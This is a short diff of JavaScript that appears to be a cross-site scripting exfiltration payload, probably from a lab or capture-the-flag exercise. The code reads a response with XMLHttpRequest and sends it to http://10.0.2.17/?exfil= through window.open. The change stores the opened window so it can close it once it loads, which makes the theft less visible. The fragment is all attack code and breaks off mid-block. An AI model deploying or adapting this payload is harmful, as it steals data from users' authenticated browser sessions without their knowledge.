@@ -1,7 +1,7 @@
 var xhr = new XMLHttpRequest();
 xhr.onreadystatechange = () =>{
         if(xhr.readyState == XMLHttpRequest.DONE){
-                window.open("http://10.0.2.17/?exfil=" + xhr.response);
+                openwindow = window.open("http://10.0.2.17/?exfil=" + xhr.response);
                 if(openwindow){
                         openwindow.onload = () => {
                                 openwindow.close();
